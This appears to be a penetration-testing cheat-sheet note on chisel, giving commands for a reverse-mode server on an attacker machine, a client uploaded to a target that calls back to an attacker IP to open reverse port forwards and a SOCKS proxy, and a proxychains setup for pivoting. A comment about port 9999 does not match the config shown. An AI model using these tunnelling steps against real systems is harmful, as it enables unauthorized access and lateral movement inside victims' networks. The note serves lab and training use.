---
tags:
  - networking
  - routing
---
# chisel

Route network traffic in restricted environments

## Capabilities

Edit `/etc/hosts` to resolve `127.0.0.1` to a hostname if necessary

Set up `chisel` in `server` mode on attacking box. This is essentially a `netcat` listener that will listen for connections on port `8050`

```bash
# Listen on 8050
chisel server -p 8050 --reverse

# Listen on 8050, allowing chisel to see the local socks5 proxy (proxychains)
chisel server --socks5 -p 8050 --reverse
```

Upload `chisel` or `chisel.exe` to target and run in `client` mode. The command `client 10.10.14.191:8050 R:socks` will reach out to our listener at `10.10.14.191:8050` and act as a SOCKS proxy, forwarding all of our traffic to its appropriate destination

```powershell
# Listen on Kali 80, forward to localhost port 80 on client
chisel client 10.10.14.191:8050 R:80:127.0.0.1:80

# Listen on Kali 4444, forward to 10.10.10.240 port 80
chisel client 10.10.14.191:8050 R:4444:10.10.10.240:80

# Create SOCKS5 listener on 1080 on Kali, proxy through client
chisel client 10.10.14.191:8050 R:socks
```

Change `/etc/proxychains4.conf`

```bash
# ... At the very bottom of the file, we set the ProxyList to only point to port 9999.
[ProxyList]
socks5 127.0.0.1 1080
```

Now when we run the following command

```bash
proxychains ping 172.16.1.12
```

Proxychains will take the command and send it through our chisel tunnel